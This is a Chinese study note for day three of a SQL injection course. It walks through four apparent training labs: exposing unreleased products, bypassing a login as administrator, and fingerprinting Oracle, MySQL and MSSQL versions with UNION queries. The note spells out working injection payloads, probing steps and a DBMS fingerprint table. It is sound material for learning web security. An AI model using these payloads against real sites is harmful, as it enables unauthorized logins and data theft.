# Day 3 · SQLi 原理、隐藏数据、登录绕过与指纹（3 h）

> 目标：建立"注入点 → 闭合 → 注释 → 观测信号"的肌肉记忆，拿下 4 个基础 lab。
> 和 CSRF 最大的不同：CSRF 是"读服务端校验代码"，SQLi 是"**读数据库的报错和返回**"。从今天起，报错信息就是你的地图。

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:50 | 原理、四类信号、注释符、DBMS 指纹 | 一页对照表 |
| 00:50–01:10 | SQLi Lab 1 隐藏数据 | `' OR 1=1--` |
| 01:10–01:25 | SQLi Lab 2 登录绕过 | `administrator'--` |
| 01:25–01:55 | SQLi Lab 3 Oracle 版本号 | `v$version` |
| 01:55–02:20 | SQLi Lab 4 MySQL / MSSQL 版本号 | `@@version` |
| 02:20–02:50 | 归纳：闭合方式 × 注释符 × 数据库 | 决策表 |
| 02:50–03:00 | 重打 Lab 3 | 手速 |

---

## 0. 原理与四类信号

注入的本质：**用户输入被当成 SQL 代码拼接**，而不是当数据。于是"引号 + 注释 + 布尔/时间/OOB 条件"就能改变查询语义。

能观测到什么，决定了你走哪条技术路线：

| 信号 | 页面表现 | 对应技术 |
|------|----------|----------|
| 回显 | 查询结果出现在 HTML 里 | `UNION` 注入（Day 4–5） |
| 布尔差异 | 页面内容/长度不同（"Welcome back" 有无） | 布尔盲注（Day 5） |
| 报错差异 | 500 / 报错文案不同 | 条件错误盲注（Day 5） |
| 时间差 | 响应耗时明显变长 | 时间盲注（Day 6） |
| 出网 | 收到 DNS/HTTP 回连 | OAST（Day 6） |

### 探测四步（每个参数都走一遍，10 秒）

1. `'` → 看是否 500 / 报错（字符串型注入点）
2. `''` → 是否恢复正常（确认是引号闭合问题，不是别的原因）
3. `' --`（或 `'#`）→ 是否恢复（确认注释符可用）
4. `' AND '1'='1` vs `' AND '1'='2` → 是否有布尔差异

### 注释符：平台差异，先试错

| 写法 | 适用 | 备注 |
|------|------|------|
| `-- ` | 通用（Oracle 必须跟空格） | URL 里 `--` 结尾常被裁，用 `--+`（`+`=空格）最稳 |
| `#` | MySQL | URL 里必须写 `%23` |
| `/* */` | 通用（含 MySQL） | 也可用于"行内截断"绕过 WAF |

### DBMS 指纹（记这张表，省 20 分钟）

| 特征 | Oracle | MySQL | MSSQL | PostgreSQL |
|------|--------|-------|-------|------------|
| 版本 | `v$version` / `banner` | `@@version` / `version()` | `@@version` | `version()` |
| 必须有 FROM | 是（常用 `dual`） | 否 | 否 | 否 |
| 字符串拼接 | `\|\|` | `CONCAT()` 或 `\|\|` | `+` | `\|\|` |
| 分页 | `ROWNUM` | `LIMIT` | `TOP` / `OFFSET` | `LIMIT` |
| 时间延迟 | `dbms_pipe.receive_message` | `SLEEP()` | `WAITFOR DELAY` | `pg_sleep()` |
| 报错带数据 | `UTL_INADDR` / `EXTRACTVALUE` | `EXTRACTVALUE` | `CAST` | `CAST` |

判断"是不是 Oracle"最快的一招：**`UNION SELECT` 后面必须带 `FROM`**，不带就报错 → 大概率 Oracle。

---

## SQLi Lab 1 · WHERE 子句隐藏数据（Apprentice / 20 min）

### 一句话
`'--` 让 `AND released = 1` 变成注释，未发布商品就露出来了。

### 观察
点 `Gifts` 分类：

```http
GET /filter?category=Gifts HTTP/1.1
```

对应查询大约：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

改 `category=Gifts'` → 500，说明单引号破坏了语法，字符串型注入点确认。

### 攻击
```
/filter?category=Gifts'--
```

得到仅含 Gifts 分类、但包含未发布商品的结果。想让"所有分类"都出来：

```
/filter?category=Gifts'+OR+1=1--
```

### 为什么有效
`--` 注释掉 `' AND released = 1`，剩下的 `WHERE category = 'Gifts'` 正常成立；`OR 1=1` 则让条件恒真，绕过分类与发布状态两个限制。

### 坑
- `--` 后面不加空格，某些数据库不认；URL 里以 `--` 结尾偶尔被客户端裁掉，写 `--+` 或 `--%20`。
- 页面上"未发布商品"可能和正常商品长得一样，只有价格/名称带 `(Unreleased)` 之类标记——别以为没生效。

### 带走
**先做最小破坏（`'`），再做最小恢复（`'--`）。** 能恢复就说明你理解了闭合，后面的 UNION 才敢往上叠。

---

## SQLi Lab 2 · 登录绕过（Apprentice / 15 min）

### 一句话
`username` 处注释掉密码判断，直接以 administrator 登录。

### 观察
登录请求：

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=wiener&password=peter
```

对应查询：

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'peter'
```

### 攻击
```
username=administrator'--&password=任意
```

结果：

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '任意'
```

### 为什么有效
注释把 `AND password = ...` 整段去掉，查询退化成"按用户名查"。返回第一条记录即视为登录成功。

### 坑
- 用 `administrator'--` 时若服务端做了参数化（部分框架会），报错但不通——那就说明这个点不可注入，别硬怼。
- 空格：`administrator' --` 和 `administrator'--` 都能过，但 `administrator'--` 在 URL 编码后要确保 `--` 没被吃掉。

### 带走
登录框是"最值得优先试"的注入点，因为**成功标准极其明确**（进去了/没进去），不需要猜响应差异。

---

## SQLi Lab 3 · Oracle 版本号（Practitioner / 30 min）

### 一句话
Oracle 的 `UNION SELECT` **必须带 FROM**，版本信息在 `v$version`，两列就用 `banner, NULL`。

### 观察
`/filter?category=Gifts` 用 `'` 确认注入 → 500。

先数列数（Day 4 会细讲，这里提前用）：

```
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--
```

到 `ORDER BY 3` 报错 → **2 列**。

### 攻击
```
/filter?category=Gifts' UNION SELECT banner, NULL FROM v$version--
```

页面某处会渲染出版本串，例如 `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`。

### 为什么有效
- `UNION` 把第二条 `SELECT` 的结果拼到原结果集后面，应用照常渲染 → 数据回显。
- 列数必须相等（2=2），类型必须兼容：`banner` 是字符串，第二列放 `NULL` 适配数字列（Oracle 里 `NULL` 可塞进任何类型位置）。
- `FROM v$version` 是 Oracle 的内置视图；**Oracle 不允许没有 FROM 的 SELECT**，这是它和 MySQL 最明显的区别。

### 坑
- 第一次写 `UNION SELECT @@version, NULL`（MySQL 习惯）→ Oracle 报 `ORA-00933`/`ORA-00942`，白等 10 分钟。**看到"必须带 FROM"的报错，立刻切 Oracle 语法。**
- `--` 结尾被裁 → 用 `--+`。
- `banner` 只能出现在 `v$version` 这种有该列的表里，别写成 `SELECT banner FROM dual`。

### 带走
**"UNION 报错说缺 FROM" 是一句免费指纹。** 之后所有 payload 默认加 `FROM dual`，直到换成别的库。

---

## SQLi Lab 4 · MySQL / MSSQL 版本号（Practitioner / 25 min）

### 一句话
两家都用 `@@version`，区别只在注释符：MySQL 用 `#`（`%23`），MSSQL 用 `--`。

### 观察
注入点同样是 `category`。先 `ORDER BY` 数出 2 列。

### 攻击

MySQL：
```
/filter?category=Gifts' UNION SELECT @@version, NULL%23
```

MSSQL：
```
/filter?category=Gifts' UNION SELECT @@version, NULL--
```

页面会显示 `8.0.32-0ubuntu0.22.04.2` 或 `Microsoft SQL Server 2019 ...`。

### 为什么有效
`@@version` 是两家的全局变量；`#` 是 MySQL 专有注释，`--` 两家都认（MSSQL 要求后跟空格）。所以**用哪个注释符能通，本身就是指纹**。

### 坑
- `#` 在 URL 里是 fragment 分隔符，**必须写成 `%23`**，否则浏览器把后面全丢了。这个坑我踩过两次。
- 用 Burp Repeater 直接发 raw 时，`#` 可以原样写（不经过浏览器），但复制到浏览器就废——统一用 `%23`。

### 带走
指纹顺序固定：`@@version` → 不通就 `version()` → 再不通就 `v$version FROM dual`。三发之内定数据库。

---

## 当日复盘

### 四个 lab 的共同结构

```
找注入点（'）→ 恢复（-- / #）→ 数清列数（ORDER BY）→ UNION SELECT 特定表/函数
```

第 4 步的"特定表/函数"才是各 lab 的差别：`products` / `users` / `v$version` / `@@version`。

### 一张图记住注释符

```
--   → 通用（Oracle/MSSQL 要空格）；URL 里写 --+ 或 --%20
#    → 仅 MySQL；URL 里写 %23
/**/ → 通用，且能当"行内截断"
```

### 三个问题自测
1. 为什么 `ORDER BY 3` 报错就能断定"2 列"？
2. 为什么 Oracle 的 `UNION SELECT` 必须写 `FROM`？`dual` 是什么？
3. 同一个 `'` 在 Lab 1 返回 500，在 Lab 2 的登录框可能"没反应"，这两种结果分别说明什么？

### 明日预告
Day 4 把"数清列数"练成 30 秒的事，然后进入**库表枚举**：`information_schema.tables` / `all_tables`，以及"字符列才能显示字符串"这个关键约束。当天会有两个 lab 因为列类型不匹配而卡住，这是正常的学习曲线。
